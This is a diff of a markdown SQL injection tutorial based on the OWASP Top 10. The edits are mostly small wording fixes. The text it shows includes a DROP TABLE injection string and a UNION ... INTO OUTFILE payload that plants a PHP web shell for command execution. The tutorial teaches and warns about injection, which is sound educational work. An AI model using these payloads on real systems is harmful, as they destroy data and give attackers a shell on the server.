@@ -1,17 +1,20 @@
 # A1-Injection
 
 > Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing unauthorized data.
-> -- <cite>https://www.owasp.org/index.php/Top_10_2013-Risks</cite>
+
+> <cite>https://www.owasp.org/index.php/Top_10_2013-Risks</cite>
+<!-- TODO: Make that cite actually cite -->
 
 ## Introduction to Injection
 
-While injection can cover a large (really, *large*) range of exploits, the most common one is probably the SQL Injection. For those of you familiar with SQL, this should be painfully obvious. Yet, people keep getting it wrong. Notable examples of people in the past who can't seem to get it right include anyone from Hells Pizza to Oracle/MySQL themselves!
+While injection can cover a large (really, *large*) range of exploits, the most common one is probably the SQL injection. For those of you familiar with SQL, this should be painfully obvious. Yet, people keep getting it wrong. Notable examples of people in the past who can't seem to get it right include anyone from Hells Pizza to Oracle/MySQL themselves!
 Hopefully this should help get you up to speed on what SQL Injection is, how to prevent it, and most importantly, how to exploit it for $$$.
 
 ### SQL Primer
 
 If you're not familiar with SQL, chances are you can find a nicer primer out there than this, but hopefully this will get you up to speed with the basics of what you need to know.
-SQL is a language for access a relational database. Imagine tables, and each of the tables has relationships to each other. So, you have a Product, which might have a Seller (that is, a company that sells this product). The tables for that might involve the product having an ID, a Title, and a Description. The Seller might involve an ID, Name, and Address. Then, a field for linking them might be Product having a Seller_id. If you're familiar with OOP, you might be able to draw parallels from there.
+SQL is a language to access relationship databases. Imagine some table, and each of the tables have relationships to each other. So, you have a Product, which might have a Seller (that is, a company that sells this product). The tables for that might involve the product having an ID, a Title, and a Description. The Seller might involve an ID, Name, and Address. Then, a field for linking them might be Product having a Seller_id. If you're familiar with OOP, you might be able to draw parallels from there.
+
 So, lets say we want to create these tables:
 ```sql
 CREATE TABLE products (id INT, title TEXT, description TEXT, seller_id INT);
@@ -23,7 +26,7 @@ INSERT INTO seller   (id, name, address) VALUES (1, "Sella", "123 Awesome Road")
 INSERT INTO products (id, title, description, seller_id) VALUES (1, "Auction Site", "Get you own instant Auction site! (May contain SQLi)", 1);
 ```
 
-And at this point, you might be able to percieve a problem. What if you want to be able to insert products based on what a user puts in on a form? Lets say we had users, and they put in their username, our SQL would now contain some of their input.
+And at this point, you might percieve a problem. What if you want to be able to insert products based on what a user puts in on a form? Lets say we had users, and they put in their username, our SQL would now contain some of their input.
 
 ### The Injection
 
@@ -32,7 +35,7 @@ Funny story, my username for this site is actually `ss23"); DROP TABLE users;`. 
 INSERT INTO users (id, username) VALUES (1, "ss23"); DROP TABLE users;
 ```
 
-In certian situations, this would actually delete all the data in that table (so, don't try it on live sites unless you like prison).
+In certian situations, this would actually delete all the data in that table (so don't try it on live sites unless you like prison).
 
 ## Our Application
 
@@ -139,5 +142,5 @@ A useful technique for getting some code execution is to get the SQL server to w
 ```sql
 SELECT * FROM products WHERE description LIKE '%d' UNION SELECT '<?php exec($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php' -- %'
 ```
-Now you simple browse to shell.php?c=ls%20-lah, and you have a shell!
+Now you simple browse to `shell.php?c=ls -lah`, and you have a shell!
 There are hundreds of ways to leverage a simple injection exploit, and while we can't cover them all here, the idea is to never have them, because as you can see, it could lead to a complete compromise before you know it.
